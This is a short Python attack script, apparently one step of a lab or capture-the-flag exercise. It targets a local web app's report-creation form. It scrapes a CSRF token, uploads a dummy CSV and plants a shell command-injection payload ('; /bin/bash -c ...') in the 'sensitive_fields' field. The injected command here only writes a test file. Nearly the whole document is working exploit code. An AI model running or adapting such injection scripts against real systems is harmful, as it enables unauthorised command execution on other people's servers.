# Step 2: Create the Python script
import requests
import os
from bs4 import BeautifulSoup

url = "http://host.docker.internal:1337/reports"
create_url = "http://host.docker.internal:1337/reports/create"
csv_file_path = "dummy.csv"  # Assuming a dummy CSV file exists
payload = "email' ; /bin/bash -c 'echo \"test\" > /tmp/test.txt' #"

# Create a dummy CSV file if it doesn't exist
if not os.path.exists(csv_file_path):
    with open(csv_file_path, "w") as f:
        f.write("email,name\ntest@example.com,Test User")

# Get CSRF token
session = requests.Session()
create_response = session.get(create_url)
create_response.raise_for_status()

soup = BeautifulSoup(create_response.text, 'html.parser')
csrf_token = soup.find('input', attrs={'name': '_token'})['value']

files = {
    "csv_file": (csv_file_path, open(csv_file_path, "rb"), "text/csv")
}
data = {
    "_token": csrf_token,
    "title": "test",
    "description": "test",
    "sensitive_fields": payload,
    "chart_type": "bar",
    "x_axis": "email",
    "y_axis": "name"
}

try:
    response = session.post(url, files=files, data=data)
    print(f"Response status code: {response.status_code}")
    print(f"Response text: {response.text}")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")